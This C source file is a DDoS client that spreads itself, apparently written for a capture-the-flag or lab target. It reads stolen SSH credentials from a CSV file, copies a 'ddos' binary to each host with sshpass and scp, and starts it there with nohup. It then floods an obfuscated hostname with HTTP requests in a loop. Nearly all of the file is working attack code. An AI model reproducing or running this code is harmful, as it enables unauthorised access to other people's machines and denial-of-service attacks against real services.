#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <curl/curl.h>
#include <stdbool.h>

typedef struct addrinfo addrinfo;

//print menu
void displayTextArt(void) {
    printf(R"EOF(

▓█████▄ ▓█████▄  ▒█████    ██████     ▄████▄   ██▓     ██▓▓█████  ███▄    █ ▄▄▄█████▓
▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒    ▒██▀ ▀█  ▓██▒    ▓██▒▓█   ▀  ██ ▀█   █ ▓  ██▒ ▓▒
░██   █▌░██   █▌▒██░  ██▒░ ▓██▄      ▒▓█    ▄ ▒██░    ▒██▒▒███   ▓██  ▀█ ██▒▒ ▓██░ ▒░
░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒   ▒▓▓▄ ▄██▒▒██░    ░██░▒▓█  ▄ ▓██▒  ▐▌██▒░ ▓██▓ ░ 
░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒   ▒ ▓███▀ ░░██████▒░██░░▒████▒▒██░   ▓██░  ▒██▒ ░ 
 ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░   ░ ░▒ ▒  ░░ ▒░▓  ░░▓  ░░ ▒░ ░░ ▒░   ▒ ▒   ▒ ░░   
 ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░     ░  ▒   ░ ░ ▒  ░ ▒ ░ ░ ░  ░░ ░░   ░ ▒░    ░    
 ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░     ░          ░ ░    ▒ ░   ░      ░   ░ ░   ░      
   ░       ░        ░ ░        ░     ░ ░          ░  ░ ░     ░  ░         ░          
 ░       ░                           ░                                               



)EOF");
}

size_t special_secret_link(void) {
    const char *link = "https://rb.gy/o411hk";
    return strlen(link);
}

void transfer(void) {
    const char *client_file_name = "ddos"; //path to the ddos file

    //open file with ssh credentials from infected machine 
    FILE *file = fopen("credentials_test.csv", "r");
    if (!file) {
        perror("Failed to open the info file");
        return;
    }

    char line[256];
    char processed_ips[256] = ""; // List of ip already used
    bool chmod_executed = false;  // Flag for tracking chmod

    while (fgets(line, sizeof(line), file) != NULL) {
        char user[64];
        char password[64];
        char ip[64];
        char port[32];

        if (sscanf(line, "%[^;];%[^;];%s;%s", user, password, ip, port) != 4) { continue; }
        // Check if ip already used
        if (strstr(processed_ips, ip) == NULL) {
            // Ip not used for scp, execute scp
            snprintf(processed_ips + strlen(processed_ips), sizeof(processed_ips) - strlen(processed_ips), " %s",
                     ip);

            // Run ssh-keyscan to accept the unknown host
            char ssh_keyscan_command[256];
            snprintf(ssh_keyscan_command, sizeof(ssh_keyscan_command),
                     "ssh-keyscan -t ed25519 -H %s >> ~/.ssh/known_hosts", ip);
            system(ssh_keyscan_command);

            // Transfer file using scp with sshpass
            char scp_command[256];
            snprintf(scp_command, sizeof(scp_command), "sshpass -p %s scp -P %s %s %s@%s:/tmp/", password, port,
                     client_file_name, user, ip);
            printf("Created command : %s\n", scp_command); // print command created
            system(scp_command);
        }

        // SSH connection to the user on the specified IP
        char ssh_command[256];

        if (chmod_executed) {
            // If CHMOD executed, don't do chmod+x
            snprintf(ssh_command, sizeof(ssh_command),
                     "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp && nohup ./ddos > /dev/null 2>&1'",
                     password, user, ip);
        } else {
            // Execute ssh with chmod
            snprintf(ssh_command, sizeof(ssh_command),
                     "sshpass -p %s ssh -oStrictHostKeyChecking=no -p 22 -f %s@%s 'cd /tmp && chmod +x ddos && nohup ./ddos > /dev/null 2>&1'",
                     password, user, ip);
            chmod_executed = true;
        }

        printf("Created command : %s\n", ssh_command); // show the current command
        system(ssh_command);
    }

    fclose(file);
}

CURL *get_curl(const char *hostname) {
    CURL *curl = curl_easy_init();

    if (!curl) {
        exit(EXIT_FAILURE);
    }

    char url[28];
    snprintf(url, 28, "http://%s", hostname);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_PORT, 80);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Russky rocket VP /poliakov 2.45"); //add custom user agent

    return curl;
}

void ddos(CURL *curl) {
    CURLcode resolution;

    freopen("/dev/null", "w", stdout); //don't show the get result
    resolution = curl_easy_perform(curl);
    freopen("/dev/tty", "w", stdout); // restablished the standard output

    if (resolution != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(resolution));
    } else {
        fputs("DDoS attack was successful.\n", stdout);
    }

    fflush(stdout);
}

void the_0bfusk1_666_h0sTn4m3(char *str) {
    const char *nbmpdibqer = "\x6C\x6D";
    const char *msdopzoinf = "\x6E\x61";
    const char *odbazmapwn = "\x2E\x63\x74\x66";
    const char *fjdoznvpzq = "\x68\x65";
    const char *vaedcvegvd = "\x73\x74";
    const char *foazuibcvi = "\x6C\x6C\x75\x78";
    const char *yzebxcpsuz = "\x61\x64";
    const char *nciuazbcvo = "\x68\x61";

    snprintf(str, 21, "%s%s%s%s%s%s%s%s",
             fjdoznvpzq,
             msdopzoinf,
             foazuibcvi,
             nciuazbcvo,
             nbmpdibqer,
             vaedcvegvd,
             yzebxcpsuz,
             odbazmapwn);
}

bool check(char *hostname, addrinfo *hints, addrinfo *result) {
    return getaddrinfo(hostname, NULL, hints, &result) == 0;
}

int main(void) {
    displayTextArt();

    transfer();

    addrinfo hints, result;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    char hostname[21];
    the_0bfusk1_666_h0sTn4m3(hostname); //ip to ddos

    CURL *curl = get_curl(hostname);

    while (!check(hostname, &hints, &result))
        ddos(curl);

    curl_easy_cleanup(curl);

    return EXIT_SUCCESS;
}
